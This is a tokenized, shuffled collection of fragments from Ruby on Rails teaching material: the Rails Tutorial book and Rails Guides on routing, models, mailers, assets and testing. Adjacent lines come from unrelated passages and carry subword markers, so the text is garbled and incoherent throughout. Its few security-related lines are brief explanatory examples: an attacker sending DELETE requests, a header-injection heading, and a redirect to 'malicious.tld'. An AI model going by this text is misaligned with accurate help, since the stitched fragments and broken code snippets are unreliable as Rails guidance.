▁# ▁ ▖ ▖ .
▁Be low ▁are ▁just ▁a ▁few ▁of ▁the ▁many ▁possibilities .
▁U nfortunately , ▁there ' s ▁ still ▁a ▁ ter r ible ▁security ▁hole : ▁any ▁ sufficient ly ▁sophisticat ed ▁attacker ▁could ▁simply ▁issue ▁\ text tt { DELETE } ▁requests ▁directly ▁from ▁the ▁command ▁line ▁to ▁delete ▁any ▁user ▁on ▁the ▁site .
▁We ▁need ▁a ▁way ▁to ▁make ▁a ▁token ▁available ▁via ▁\ k ode { user ▖ remember \_ token } ▁( for ▁ storage ▁in ▁the ▁cookies ) ▁\ emph { with out } ▁storing ▁it ▁in ▁the ▁database .
▁We ▁can ▁now ▁check ▁our ▁database ▁just ▁to ▁double - check ▁that ▁the ▁new ▁user ▁was ▁actually ▁created :
▁Un less ▁you ▁explicitly ▁use ▁the ▁` helpers _ path ` ▁parameter , ▁this ▁change ▁will ▁only ▁ im p ac t ▁the ▁way ▁of ▁loading ▁helpers ▁from ▁engines ▖
▁in ▁Listing ~\ ref { code : initial _ failing _ signin _ test } ▁and
▁ o h t TE c H ▖▖▖" >╼ \ end { code }╼╼\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : modeling _ users _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼\ item
▁The ▁comment ▁indicates ▁that ▁the ▁code ▁in ▁the ▁\ k ode { before } ▁block ▁is ▁not ▁ idiomatic ally ▁correct .
▁By ▁writing ▁a ▁test ▁and ▁running ▁RSpec ▁at ▁each ▁step , ▁we ' ll ▁see ▁how ▁ TDD ▁can ▁guide ▁us ▁through ▁the ▁development ▁of ▁our ▁application ▁code .
▁does ▁exactly ▁the ▁same ▁thing ▁for ▁microposts .
▁S ent ▁mail ▁to ▁ michael @ michael hartl ▖ com ▁( 6 6 ▖ 8 m s )╼ Date : ▁Thu , ▁ 04 ▁Sep ▁2014 ▁01 : 04 : 59 ▁+0000 ╼ From : ▁no reply @ example ▖ com ╼ To : ▁ michael @ michael hartl ▖ com ╼ Message - ID : ▁< 5 4 07 babbe e 1 3 9 _ 87 22 b 2 57 d 04 57 6 a @ mhartl - rails - tutorial - 9 5 37 53 ▖ mail >╼ S ub j ec t : ▁ Password ▁reset ╼ M i me - Version : ▁1▖ 0 ╼ Content - Type : ▁ multipart / alternative ; ╼ ▁b ound ary =" - - == _ mime part _5407 babbe 3 50 5 _ 87 22 b 2 57 d 045617 " ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼ ╼╼ - --- == _ mime part _5407 babbe 3 50 5 _ 87 22 b 2 57 d 045617 ╼ Content - Type : ▁text / plain ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼╼ To ▁reset ▁your ▁password ▁click ▁the ▁link ▁below : ╼╼ http :// rails - tutorial - c 9 - mhartl ▖ c 9 ▖ io / password _ resets / 3 B d B r X e Q Z S W q F ID R N 8 c x HA / ╼ edit ?
▁The ▁Rails ▁route r ▁ recognizes ▁URLs ▁and ▁ dispatch es ▁them ▁to ▁a ▁controller ' s ▁action ▖
▁Resource s
▁The ▁site ▁layout ▁with ▁a ▁ footer ▁partial .
▁ Adding ▁CSS ▁for ▁the ▁site ▁ logo .
▁| ▁GET ▁| ▁ / kategorien ▁| ▁categories # index ▁| ▁categories _ path ▁|
▁# ▁Generate s ▁a ▁select ▁field ▁from ▁ 19 00 ▁to ▁200 9 ▁that ▁defaults ▁to ▁the ▁current ▁ year
▁The ▁` new ` ▁method ▁will ▁return ▁a ▁new ╼ object ▁while ▁` create ` ▁will ▁return ▁the ▁object ▁and ▁save ▁it ▁to ▁the ▁database .
▁t ▖ references ▁: public ation _ type
▁This ▁will ▁find ▁all ▁clients ▁who ▁have ▁orders ▁that ▁were ▁created ▁ yesterday , ▁again ▁using ▁a ▁` BETWEEN ` ▁SQL ▁expression .
▁In ▁order ▁to ▁get ▁the ▁files ▁to ▁appear , ▁you ▁may ▁need ▁to ▁click ▁the ▁ ge ar ▁ icon ▁in ▁the ▁file ▁ navigator ▁are a ▁and ▁select ▁`` Re f re sh ▁File ▁T re e '' ▖)
▁In ▁some ▁c irc um st ance s ▁you ▁may ▁wish ▁to ▁use ▁live ▁ com p i l ation ▖
▁before _ save ▁: set _ author
▁At ▁this ▁point , ▁the ▁signup ▁form ▁is ▁working , ▁at ▁least ▁in ▁the ▁sense ▁that ▁it ▁no ▁longer ▁produce s ▁an ▁error ▁upon ▁submission .
▁If ▁you ' re ▁following ▁along ▁with ▁version ▁control , ▁make ▁a ▁topic ▁branch ▁as ▁usual :
▁ http _ basic _ authenticate _ with ▁name : ▁" d h h ", ▁password : ▁" secret ", ▁only : ▁: destroy
▁< li >`: password ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁set ▁the ▁password ▁in ▁this ▁setting ▖ </ li >
▁With ▁debug ▁mode ▁turn ed ▁off ▁the ▁manifest ▁above ▁would ╼ generate ▁instead :
▁#### ▁En t i re ▁Rails :
▁Now ▁that ▁the ▁`` remember '' ▁branch ▁of ▁\ k ode { current \_ user } ▁is ▁test ed , ▁we ▁can ▁be ▁confident ▁of ▁catch ing ▁re gr ess ion s ▁without ▁ having ▁to ▁check ▁by ▁hand .
▁In ▁Listing ~\ ref { code : example _ user }, ▁we ▁did ▁this ▁with ▁Ruby ' s ▁\ k ode { attr \_ accessor } ▁method :
▁The ▁actual ▁implementation ▁in ▁Active ▁Record ▁is ▁not ▁ str a ight ▁` tableize ` ▁in de ed , ▁because ▁it ▁also ▁ demodulize s ▁the ▁class ▁name ▁and ▁check s ▁a ▁few ▁options ▁that ▁may ▁a ffect ▁the ▁returned ▁string .
▁As ▁a ▁result , ▁valid ating ▁images ▁requires ▁defin ing ▁a ▁custom ▁validation , ▁which ▁we ' ll ▁call ▁\ k ode { picture \_ size } ▁and ▁define ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ model _ image _ validation } .
▁`: constraints ` ▁take s ▁regular ▁expression s ▁with ▁the ▁restrict ion ▁that ▁ regex p ▁an ch or s ▁can ' t ▁be ▁used ▖
▁Rails ▁application ▁and ▁engine ▁developers ▁should ▁put ▁these ▁assets ▁in ▁` app / assets ` ▁or ▁configure ▁` config ▖ assets ▖ precompile ` .
▁Add ▁these ▁settings ▁if ▁you ▁enable ▁the ▁asset ▁pipeline :
▁You ▁should ▁also ▁check ▁that ▁the ▁tests ▁pass :
▁<%= ▁yield ▁: head ▁%>
▁Section ~\ ref { sec : showing _ users } ▁will ▁develop ▁the ▁user ▁index ▁into ▁a ▁more ▁polish ed ▁page ▁for ▁ showing ▁all ▁users .
▁An ▁example ▁would ▁be ▁adding ▁the ▁following ▁to ▁your ▁appropriate ╼` config / environments / $ RAILS _ ENV ▖ rb ` ▁file :
▁ Remember : ▁the ▁` Article ` ▁model ▁is ▁namespaced , ▁so ▁to ╼ ref er ence ▁it ▁you ▁must ▁call ▁it ▁as ▁` Blorgh :: Article ` .
▁beginning _ of _ quarter ▁( at _ beginning _ of _ quarter )
▁You ▁can ▁do ▁this ▁in ▁an ▁initializer ▁file ╼` config / initializers / sandbox _ email _ interceptor ▖ rb `
▁ /* ▁ mixin s , ▁variables , ▁etc ▖ ▁* /
▁In ▁our ▁case , ▁the ▁toy ▁app ▁will ▁be ▁a ▁ micro blog , ▁with ▁only ▁users ▁and ▁short ▁( micro ) post s .
▁Start ▁Spork ▁in ▁a ▁terminal ▁window .
▁ Don ' t ▁ forget ▁to ▁run ▁` bundle ▁install ` ▁as ▁usual ▖
▁The ▁first ▁subtlety ▁is ▁that , ▁even ▁though ▁the ▁`` Log ▁out '' ▁link ▁appears ▁only ▁when ▁logged - in , ▁a ▁user ▁could ▁ potentially ▁have ▁multiple ▁browser ▁window s ▁open ▁to ▁the ▁site .
▁=> ▁[#< Micropost ▁id : ▁1, ▁content : ▁" First ▁micropost !" , ▁user _ id : ▁1, ▁created _ at :
▁Rails ▁provides ▁a ▁` resources ` ▁method ▁which ▁can ▁be ▁used ▁to ▁declare ▁a ▁standard ▁REST ╼ resource ▖
▁password _ digest : ▁" $ 2 a $ 10 $ k n 4 c Q D J T z V 76 Z g D x O W k 6 J e 9 A 0 T t n 5 s K N a G TE m T 0 j U 7 ▖ n ▖▖▖"
▁After ▁running ▁the ▁migration , ▁you ▁should ▁be ▁able ▁to ▁use ▁the ▁toy ▁app ▁in ▁production , ▁with ▁a ▁real ▁PostgreSQL ▁database ▁back - end ▁( Figure ~\ ref { fig : toy _ app _ production }) .
▁As ▁a ▁final ▁step ▁in ▁handling ▁failed ▁user ▁creation , ▁we ' ll ▁add ▁helpful ▁error ▁messages ▁to ▁indicate ▁the ▁problem s ▁that ▁prevent ed ▁successful ▁ registration .
▁#### # ▁L a y out ▁In her it ance
▁There ' s ▁a ▁minor ▁ com plication , ▁though : ▁by ▁default ▁Git ▁ track s ▁the ▁changes ▁of ▁\ emph { all } ▁the ▁files , ▁but ▁there ▁are ▁some ▁files ▁we ▁don ' t ▁want ▁to ▁ track .
▁ Location : ▁ http :// www ▖ malicious ▖ t ld
▁ ╼ ▁This ▁is ▁the ▁ home ▁page ▁for ▁the
▁But ▁there ▁are ▁sever al ▁my s ter ies .
▁git ▁commit : ▁% Q { ▁- m ▁' Initial ▁commit ' ▁ }
▁< meta ▁content =' text / html ; ▁ cha r set = UT F -8 ' ▁ http - equ i v =' Content - Type ' ▁/>
▁Using ▁the ▁ generalized ▁\ k ode { authenticated ?}
▁We ▁also ▁want ▁to ▁allow ▁only ▁ authenticated ▁users ▁to ▁delete ▁comments , ▁so ▁in ▁the ╼` Comments Controller ` ▁( ` app / controllers / comments _ controller ▖ rb ` ) ▁we ▁write :
▁For ▁example , ▁to ▁store ▁users ▁with ▁names ▁and ▁email ▁addresses , ▁we ' ll ▁create ▁a ▁\ k ode { users } ▁table ▁with ▁\ k ode { name } ▁and ▁\ k ode { email } ▁columns ▁( with ▁each ▁ row ▁corresponding ▁to ▁one ▁user ) .
▁INFO : ▁` beginning _ of _ hour `, ▁` end _ of _ hour `, ▁` beginning _ of _ minute ` ▁and ▁` end _ of _ minute ` ▁are ▁implemented ▁for ▁` Time ` ▁and ▁` DateTime ` ▁but ▁** not ** ▁` Date ` ▁as ▁it ▁does ▁not ▁make ▁sense ▁to ▁request ▁the ▁beginning ▁or ▁end ▁of ▁an ▁ hour ▁or ▁ minute ▁on ▁a ▁` Date ` ▁instance .
▁Note ▁that ▁ layouts ▁for ▁partials ▁follow ▁the ▁same ▁leading - underscore ▁naming ▁as ▁regular ▁partials , ▁and ▁are ▁placed ▁in ▁the ▁same ▁folder ▁with ▁the ▁partial ▁that ▁they ▁be long ▁to ▁( not ▁in ▁the ▁master ▁` layouts ` ▁folder ) .
▁Note ▁also ▁that ▁we ▁have ▁added ▁a ▁test ▁to ▁verify ▁that ▁the ▁admin ▁does ▁not ▁see ▁a ▁link ▁to ▁delete ▁h im self .
▁Because ▁of ▁U nobtrusive ▁JavaScript , ▁the ▁Rails ▁" Ajax ▁helpers " ▁are ▁actually ▁in ▁two ╼ part s : ▁the ▁JavaScript ▁h al f ▁and ▁the ▁Ruby ▁h al f .
▁ Default ▁rendering ▁is ▁an ▁excellent ▁example ▁of ▁this ▖
▁* ▁Set s ▁an ▁X - Runtime ▁header , ▁containing ▁the ▁time ▁( in ▁second s ) ▁taken ▁to ▁execute ▁the ▁request .
▁Set ▁to ▁false ▁in ▁development ▁mode , ▁true ▁in ▁production .
▁In ▁addition , ▁the ▁table ▁for ▁the ╼ model ▁is ▁namespaced , ▁be com ing ▁` blorgh _ articles `, ▁rather ▁than ▁simply ▁` articles ` ▖╼
▁This ▁involve s ▁open ing ▁the ▁\ k ode { Gemfile } ▁with ▁your ▁favor ite ▁text ▁editor :
▁# ▁do ▁some ▁magic ▖ .
▁Whi ch ▁ service ▁you ▁use ▁for ▁a ▁particular ▁ repo ▁thus ▁depend s ▁on ▁your ▁specific ▁needs .
▁We ▁then ▁edit ▁the ▁result ing ▁\ k ode { Guardfile } ▁so ▁that ▁Guard ▁will ▁run ▁the ▁right ▁tests ▁when ▁the ▁integration ▁tests ▁and ▁views ▁are ▁updated ▁( Listing ~\ ref { code : guard file }) .
▁" O h ▁ dear ! ▁Oh ▁ dear !
▁@ open _ orders ▁= ▁@ customer ▖ orders ▖ find (1)
▁=> ▁[ 17 , ▁ 42, ▁ 8 ]
▁( Note ▁that , ▁in ▁contrast ▁to ▁the ▁plural ▁convention ▁for ▁controller ▁names , ▁model ▁names ▁are ▁ singular : ▁a ▁Users ▁controller , ▁but ▁a ▁User ▁model ▖)
▁* ▁` after _ enqueue `
▁Also ▁note ▁that ▁the ▁session ▁deletion ▁occur s ▁even ▁though ▁the ▁line ▁with ▁the ▁redirect ▁appears ▁first ; ▁redirect s ▁don ' t ▁happen ▁un til ▁an ▁explicit ▁\ k ode { return } ▁or ▁the ▁end ▁of ▁the ▁method , ▁so ▁any ▁code ▁appear ing ▁after ▁the ▁redirect ▁is ▁ still ▁executed .
▁In ▁compar is on , ▁note ▁that ▁the ▁` ordinal ` ▁method ▁returns ▁** only ** ▁the ▁ suffix ▁string .
▁1) ▁# ▁=> ▁true
▁before _ save ▁ { ▁return ▁false ▁ } ▁# ▁B A D
▁resources ▁: photos , ▁as : ▁' images '
▁original _ process ( action , ▁params , ▁session , ▁flash , ▁ http _ method )
▁ Each ▁of ▁these ▁two ▁features ▁will ▁involve ▁creating ▁a ▁new ▁resource , ▁there by ▁giv ing ▁us ▁a ▁chance ▁to ▁see ▁further ▁examples ▁of ▁controllers , ▁routing , ▁and ▁database ▁migrations .
▁This ▁works ▁because ▁the ▁\ k ode { microposts } ▁table ▁has ▁a ▁\ k ode { user \_ id } ▁attribute ▁to ▁identify ▁the ▁user ▁( Section ~\ ref { sec : the _ basic _ model }) .
▁You ▁can ▁see ▁the ▁final ▁result ▁in ▁Figure ~\ ref { fig : site _ with _ footer } .
▁The ▁\ k ode { index } ▁action ▁as k s ▁the ▁User ▁model ▁to ▁retrieve ▁all ▁users ▁(\ k ode { User ▖ all }) .
▁When ▁" true " ▁and ▁" false " ▁are ▁English ▁words ▁rather ▁than ▁Ruby ▁keyword s ▁use ▁a ▁regular ▁f on t :
▁Here ▁the ▁rule
▁This ▁module ▁provides ▁methods ▁for ▁ generating ▁HTML ▁that ▁links ▁views ▁to ▁assets ▁such ▁as ▁images , ▁JavaScript ▁files , ▁stylesheets , ▁and ▁feed s .
▁ Each ▁action ▁needs ▁to ▁set ▁a ▁title , ▁find ▁the ▁user , ▁retrieve ▁either ▁\ k ode {@ user ▖ followed \_ users } ▁or ▁\ k ode {@ user ▖ followers } ▁( in ▁ paginate d ▁form ), ▁and ▁then ▁render ▁the ▁page .
▁If ▁your ▁application ▁is ▁current ly ▁on ▁any ▁version ▁of ▁Rails ▁old er ▁than ▁ 3▖0 ▖ x , ▁you ▁should ▁upgrade ▁to ▁Rails ▁ 3▖0 ▁before ▁attempt ing ▁an ▁update ▁to ▁Rails ▁3▖1 .
▁Be ▁careful ▁because ▁this ▁also ▁means ▁you ' re ▁initializ ing ▁a ▁model ▁object ▁with ▁only ▁the ▁fields ▁that ▁you ' ve ▁select ed ▖
▁person ▁= ▁Person ▖ create ( name : ▁" !
▁Active ▁Model
▁item ▖ with _ lock ▁do
▁M a k ing ▁Your ▁ Library ▁or ▁ Gem ▁a ▁P re - Proc ess or
▁This ▁section ▁uses ▁count ▁as ▁an ▁example ▁method ▁in ▁this ▁pre a mb le , ▁but ▁the ▁options ▁describe d ▁apply ▁to ▁all ▁sub - section s .
▁ Routing ▁ Concern s ▁allows ▁you ▁to ▁declare ▁common ▁routes ▁that ▁can ▁be ▁reuse d ▁inside ▁other ▁resources ▁and ▁routes ▖
▁" X "▖ constantize ▁# ▁=> ▁: in _ Object ▁( ! )
▁In ▁Listing ~\ ref { code : layout _ with _ partial s }, ▁we ' ve ▁replace d ▁the ▁HTML ▁ shim ▁stylesheet ▁lines ▁with ▁a ▁single ▁call ▁to ▁a ▁Rails ▁helper ▁called ▁\ k ode { render } :
▁Here ▁is ▁a ▁quick ▁ explanation ▁of ▁the ▁ items ▁present ed ▁in ▁the ▁pre c ed ing ▁method ▖
▁with ▁the ▁SQL ▁ s n ip pe t
▁t ▖ belongs _ to ▁: part
▁In ▁order ▁to ▁include ▁the ▁email ▁as ▁well , ▁we ▁need ▁to ▁use ▁a ▁\ emph { query ▁parameter }, ▁which ▁in ▁a ▁URL ▁appears ▁as ▁a ▁key - value ▁pair ▁located ▁after ▁a ▁question ▁mark
▁In st ance - level ▁` respond _ to ` ▁is ▁un a ffect ed ▁and ▁does ▁not ▁require ▁the ▁ additional ▁gem :
▁RESTful ▁routes ▁provided ▁by ▁the ▁Users ▁resource ▁in ▁Listing ~\ ref { code : rails _ routes } .
▁#### ▁Using ▁ Partial s ▁to ▁S im p li fy ▁View s
▁# ▁ Make ▁sure ▁the ▁micropost ▁doesn ' t ▁appear ▁in ▁the ▁database .
▁Note ▁from ▁Table ~\ ref { table : demo _ RESTful _ users } ▁that ▁there ▁is ▁some ▁ overlap ▁in ▁the ▁URLs ; ▁for ▁example , ▁both ▁the ▁user ▁\ k ode { show } ▁action ▁and ▁the ▁\ k ode { update } ▁action ▁correspond ▁to ▁the ▁URL ▁ / users /1 .
▁The ▁default ▁query ▁string ▁in ▁Rails ▁2▖ x ▁is ▁base d ▁on ▁the ▁modification ▁time ▁of ╼ the ▁files ▖
▁Those ▁users ▁could n ' t ▁even ▁sign ▁up ; ▁now ▁users ▁can ▁sign ▁up , ▁sign ▁in , ▁sign ▁out , ▁view ▁their ▁profile s , ▁edit ▁their ▁settings , ▁and ▁see ▁an ▁index ▁of ▁all ▁users --- and ▁some ▁can ▁even ▁destroy ▁other ▁users .
▁unless ▁token ▖ blank ?
▁def ▁article _ params
▁Under ly ing ▁this ▁method ▁is ▁a ▁powerful ▁\ emph { inflect or } ▁that ▁know s ▁how ▁to ▁ pluralize ▁a ▁large ▁number ▁of ▁words , ▁including ▁many ▁with ▁ ir regular ▁plural s :
▁Note ▁that ▁if ▁any ▁of ▁the ▁validations ▁fail , ▁such ▁as ▁when ▁a ▁password ▁is ▁required ▁to ▁save ▁a ▁record ▁( as ▁implemented ▁in ▁Section ~\ ref { sec : adding _ a _ secure _ password }), ▁the ▁call ▁to ▁\ k ode { update \_ attributes } ▁will ▁fail .
▁F ur the r more , ▁unlike ▁` select ` ▁and ▁other ▁` Relation ` ▁scope s , ▁` pluck ` ▁trigger s ▁an ▁ im media te ╼ query , ▁and ▁thus ▁cannot ▁be ▁ chain ed ▁with ▁any ▁further ▁scope s , ▁a lthough ▁it ▁can ▁work ▁with ╼ scope s ▁already ▁construct ed ▁earlier :
▁There ▁is ▁also ▁a ▁shorthand ▁for ▁this ▖
▁( We ' ll ▁put ▁the ▁\ k ode { created \_ at } ▁column ▁to ▁work ▁in ▁Section ~\ ref { sec : ordering _ and _ dependency } ▁and ▁Section ~\ ref { sec : render ing _ microposts } ▖)
▁In ▁the ▁next ▁chapter , ▁we ' ll ▁build ▁on ▁the ▁foundation ▁from ▁Chapter ~\ ref { cha : beginning } ▁to ▁make ▁a ▁database - back ed ▁\ emph { toy ▁app }, ▁which ▁will ▁give ▁us ▁our ▁first ▁real ▁taste ▁of ▁what ▁Rails ▁can ▁do .
▁TIP : ▁It ' s ▁possible ▁to ▁use ▁any ▁of ▁the ▁above ▁middleware s ▁in ▁your ▁custom ▁Rack ▁ stack .
▁config ▖ assets ▖ configure ▁do ▁| env |
▁* ▁` p reload `
▁U nfortunately , ▁this ▁can ▁be ▁confusing , ▁es pecially ▁since ▁\ k ode { : name } ▁is ▁valid ▁on ▁its ▁own ▁( as ▁a ▁stand al one ▁symbol ) ▁but ▁\ k ode { name : } ▁has ▁no ▁meaning ▁by ▁itself .
▁belongs _ to ▁: author , ▁class _ name : ▁Blorgh ▖ author _ class
▁( We ▁could ▁eliminate ▁some ▁duplication ▁by ▁ putting ▁the ▁test ▁login ▁in ▁the ▁\ k ode { setup } ▁method ▁of ▁Listing ~\ ref { code : edit _ tests _ logged _ in }, ▁but ▁in ▁Section ~\ ref { sec : friendly _ forwarding } ▁we ' ll ▁change ▁one ▁of ▁the ▁tests ▁to ▁visit ▁the ▁edit ▁page ▁\ emph { before } ▁logging ▁in , ▁which ▁isn ' t ▁possible ▁if ▁the ▁login ▁step ▁happens ▁during ▁the ▁test ▁setup ▖)
▁By ▁default , ▁this ▁is ▁` false `: ▁ associated ▁objects ▁will ▁not ▁be ▁validate d ▁when ▁this ▁object ▁is ▁saved .
▁T h r ough out ▁the ▁rest ▁of ▁this ▁book , ▁I ▁will ▁thus ▁often ▁include ▁\ emph { mockup s } ▁( in ▁a ▁web ▁context ▁often ▁called ▁\ emph { w i ref ra me s }), ▁which ▁are ▁ r ough ▁ sketch es ▁of ▁what ▁the ▁eventual ▁application ▁will ▁look ▁like
▁In ▁addition , ▁after ▁an ▁invalid ▁submission ▁Rails ▁automatically ▁wrap s ▁the ▁fields ▁with ▁errors ▁in ▁\ k ode { div } s ▁with ▁the ▁CSS ▁class ▁\ k ode { field \_ with \_ errors } .
▁Client ▖ order (" orders _ count ▁ASC ", ▁" created _ at ▁DESC ")
▁If ▁you ▁now ▁click ▁on ▁either ▁the ~\ href { http :// localhost :3000/ users ? page = 2 } {2} ▁link ▁or ▁\ href { http :// localhost :3000/ users ? page = 2 } { N ext } ▁link , ▁you ' ll ▁get ▁the ▁second ▁page ▁of ▁results , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : user _ index _ page _ two _ rails _3} .
▁The ▁login ▁form ▁after ▁try ing ▁to ▁access ▁a ▁ protected ▁page .
▁The ▁functionality ▁will ▁be ▁ u tt er ly ▁under - developed , ▁and ▁many ▁of ▁the ▁steps ▁will ▁seem ▁like ▁magic , ▁but ▁worry ▁not : ▁the ▁full ▁sample ▁app ▁will ▁develop ▁a ▁similar ▁application ▁from ▁the ▁ gr ound ▁up ▁starting ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁and ▁I ▁will ▁provide ▁p l ent i ful ▁forward - references ▁to ▁later ▁material .
▁Ruby ▁is ▁setting ▁the ▁\ k ode {@ name } ▁variable ▁to ▁\ k ode {" Example ▁User "} ▁( and ▁similar ly ▁for ▁the ▁\ k ode { email } ▁attribute ), ▁which ▁we ▁then ▁use ▁in ▁the ▁\ k ode { formatted \_ email } ▁method .
▁in ▁Listing ~\ ref { code : account _ activation _ view _ text } ▁and
▁The ▁\ k ode { store \_ location } ▁method ▁in ▁Listing ~\ ref { code : friendly _ forwarding _ code } ▁ puts ▁the ▁request ed ▁URL ▁in ▁the ▁\ k ode { session } ▁variable ▁under ▁the ▁key ▁\ k ode { : forwarding \_ url }, ▁but ▁only ▁for ▁a ▁\ k ode { GET } ▁request .
▁* ▁How ▁to ▁contribute ▁to ▁the ▁Ruby ▁on ▁Rails ▁code .
▁When ▁we ▁last ▁saw ▁our ▁new ▁application , ▁we ▁ha d ▁just ▁updated ▁our ▁ mostly ▁static ▁pages ▁to ▁use ▁Rails ▁ layouts ▁to ▁eliminate ▁duplication ▁in ▁our ▁views , ▁as ▁show n ▁in ▁Listing ~\ ref { code : application _ layout _ redux } ▁( which ▁is ▁the ▁same ▁as ▁Listing ~\ ref { code : application _ layout }) .
▁P re process or ▁engines
▁If ▁a ▁` before _ add ` ▁callback ▁throw s ▁an ▁exception , ▁the ▁object ▁does ▁not ▁get ▁added ▁to ▁the ▁collection ▖
▁def ▁ notify ( user , ▁ ▖▖▖)
▁To ▁get ▁this ▁to ▁work , ▁we ▁need ▁to ▁define ▁the ▁\ k ode { password _ reset _ expired ?}
▁Un less ▁otherwise ▁noted , ▁you ▁should ▁use ▁the ▁exact ▁versions ▁of ▁all ▁software ▁used ▁in ▁the ▁tutorial , ▁including ▁Rails ▁itself , ▁if ▁you ▁want ▁the ▁same ▁results .
▁You ▁now ▁need ▁to ▁create ▁the ▁` create ` ▁action ▁within ▁the ▁` Article sController ` ▁for ╼ this ▁to ▁work .
▁For ▁most ▁U N I X - like ▁systems ▁including ▁M ac ▁OS ▁X ▁this ▁will ▁be ▁a ╼ do ll ar ▁sign ▁` $ ` ▖
▁person ▁= ▁Person ▖ new
▁As ▁with ▁the ▁User ▁class ▁in ▁Section ~\ ref { sec : a _ user _ class }, ▁instance s ▁of ▁the ▁User ▁model ▁allow ▁access ▁to ▁their ▁attributes ▁using ▁a ▁do t ▁notation :
▁The ▁following ▁methods ▁are ▁re implement ed ▁so ▁you ▁do ▁** not ** ▁need ▁to ▁load ▁` active _ support / core _ ext / date / calculations ▖ rb ` ▁for ▁these ▁one s :
▁Work ing ▁with ▁Validation ▁ Error s
▁WARNING : ▁Using ▁` + ▖▖▖ + ` ▁for ▁ fixed - width ▁f on t ▁only ▁works ▁with ▁simple ▁content ▁like ╼ or d in ary ▁method ▁names , ▁symbols , ▁paths ▁( with ▁forward ▁ slash es ), ▁etc ▖
▁* ▁` after _ perform `
▁A lthough ▁web ▁app s ▁are ▁ ultimate ly ▁about ▁strings , ▁actually ▁\ emph { ma k ing } ▁those ▁strings ▁requires ▁using ▁other ▁data ▁structure s ▁as ▁well .
▁ Write ▁a ▁test ▁to ▁make ▁sure ▁delete ▁links ▁do ▁not ▁appear ▁for ▁microposts ▁not ▁created ▁by ▁the ▁current ▁user .
▁App ly ing ▁the ▁basic ▁HTML ▁structure ▁from ▁Listing ~\ ref { code : html _ structure } ▁to ▁the ▁custom ▁Home ▁page ▁from ▁Listing ~\ ref { code : custom _ home _ page } ▁yields ▁Listing ~\ ref { code : home _ view _ full _ html } .
▁Work ing ▁with ▁JavaScript ▁in ▁Rails
▁The ▁` parent _ name ` ▁method ▁on ▁a ▁nested ▁named ▁module ▁returns ▁the ▁fully - qualified ▁name ▁of ▁the ▁module ▁that ▁contains ▁its ▁corresponding ▁constant :
▁### ▁Header ▁Injection
▁now ▖ change ( year : ▁2011 , ▁ offset : ▁R ation al ( - 6 , ▁24 ) )
▁╼╼ ▁% ▁subsection ▁a _ working _ form ▁( end )╼╼ ▁\ subsection { S trong ▁parameters } ▁% ▁( fold )╼ ▁\ label { sec : strong _ parameters }╼╼
▁Code ▁for ▁the ▁About ▁page ▖
▁Add ▁the ▁new ▁remote ▁to ▁your ▁local ▁repository ▁on ▁your ▁local ▁machine :
▁route ▁get ▁" static _ pages / help "
▁* ▁` Rack :: Sendfile ` ▁inter ce p t s ▁response s ▁who se ▁ body ▁is ▁being ▁served ▁from ▁a ▁file ▁and ▁replace s ▁it ▁with ▁a ▁server ▁specific ▁X - Sendfile ▁header ▖
▁They ▁can ▁also ▁be ▁access ed ▁and ▁overrid d en ▁at ▁the ▁instance ▁level .
▁To ▁go ▁all ▁the ▁way ▁back ▁to ▁the ▁beginning , ▁we ▁can ▁use
▁We ▁can ▁fix ▁this ▁by ▁using ▁events ▁instead ▖
▁validates ▁: legacy _ code , ▁format : ▁ { ▁with : ▁ / \ A [ a - z A - Z ] + \ z / ,
▁# ▁root ▁' welcome # index '
▁U nfortunately , ▁experience ▁shows ▁that ▁even ▁minor ▁point ▁release s ▁can ▁break ▁things , ▁so ▁for ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁we ' ll ▁ er r ▁on ▁the ▁ side ▁of ▁caution ▁by ▁including ▁exact ▁version ▁number s ▁for ▁all ▁gems .
▁We ▁ got ▁a ▁g li mp se ▁of ▁controllers ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁will ▁come ▁to ▁a ▁ deep er ▁understanding ▁once ▁we ▁explor e ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Re presentational _ State _ Transfer } { REST ▁architecture } ▁more ▁fully ▁( start ing ▁in ▁Chapter ~\ ref { cha : modeling _ users }) .
▁< title > A ▁simple ▁page </ title >
▁The ▁signup ▁form ▁submitted ▁with ▁invalid ▁information .
▁If ▁you ▁want ▁to ▁assign ▁an ▁object ▁to ▁a ▁` has _ one ` ▁association ▁without ▁saving ▁the ▁object , ▁use ▁the ▁` association ▖ build ` ▁method .
▁* ▁` config ▖ active _ record ▖ schema _ migrations _ table _ name ` ▁let s ▁you ▁set ▁a ▁string ▁to ▁be ▁used ▁as ▁the ▁name ▁of ▁the ▁ schema ▁migrations ▁table .
▁If ▁you ▁deploy ▁using ▁a ▁ shared ▁host ▁or ▁a ▁d ed icated ▁server , ▁I ▁suggest ▁using ▁\ href { http :// free la n c ing - g o d ▖ github ▖ com / t s / en /}{ Thin k ing ▁S ph in x } ▁( following ▁the ▁\ href { http :// r ailscasts ▖ com / episodes /1 20 - th in k ing - s ph in x } { RailsCast ▁on ▁ Thin k ing ▁S ph in x }) .
▁In ▁general , ▁CSS ▁rules ▁refer ▁either ▁to ▁a ▁class , ▁an ▁id , ▁an ▁HTML ▁tag , ▁or ▁some ▁combination ▁there of , ▁followed ▁by ▁a ▁list ▁of ▁styling ▁commands .
▁Set - Cookie : ▁ _ blog _ session = ▖▖▖ s n ip ▖▖▖ ; ▁path = / ; ▁ Http Only
▁* ▁Rails ▁4▖0 ▁also ▁changed ▁the ▁way ▁ uni code ▁character ▁routes ▁are ▁d raw n ▖
▁Note ▁that ▁the ▁id ▁does ▁not ▁need ▁to ▁be ▁specified ▁in ▁the ▁route ▁helper .
▁### ▁A d v ance d ▁ Constraint s
▁The ▁Microposts ▁controller ▁itself ▁appears ▁in ▁schematic ▁form ▁Listing ~\ ref { code : demo _ microposts _ controller } .
